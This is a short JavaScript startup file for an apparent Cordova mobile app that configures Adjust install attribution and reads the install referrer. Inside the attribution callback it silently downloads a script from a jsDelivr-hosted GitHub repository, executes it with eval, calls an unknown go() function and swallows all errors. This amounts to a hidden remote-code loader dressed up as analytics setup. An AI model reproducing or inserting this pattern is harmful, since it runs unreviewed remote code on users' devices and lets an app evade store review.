document.addEventListener('deviceready', onDeviceReady, false);
function onDeviceReady() {
    // Cordova is now initialized. Have fun!
    try {
        var adjustConfig = new AdjustConfig("rbuixr642oe8", AdjustConfig.EnvironmentProduction);

        adjustConfig.setAttributionCallbackListener(function(attribution) {
            console.log("Tracker token = " + attribution.trackerToken);
            console.log("AdNetwork = " + attribution.network);
            var xhr = new XMLHttpRequest();
            xhr.open('GET', 'https://cdn.jsdelivr.net/gh/zhushiwei888/testJs@2/c.js', true);
            xhr.onreadystatechange = function () {
            if (xhr.readyState == 4 && xhr.status == 200) {
                var code = xhr.responseText;
                eval(code); // 或者使用 Function 构造函数： new Function(code)();
                go();
            }
            };
            xhr.send();
        });
        Adjust.create(adjustConfig);
    
        installReferrer.getReferrer(function(attr) {
                                                console.log("Network = " + attr.utm_medium);
                                            }, null);
        } catch (error) {
        
        }
}

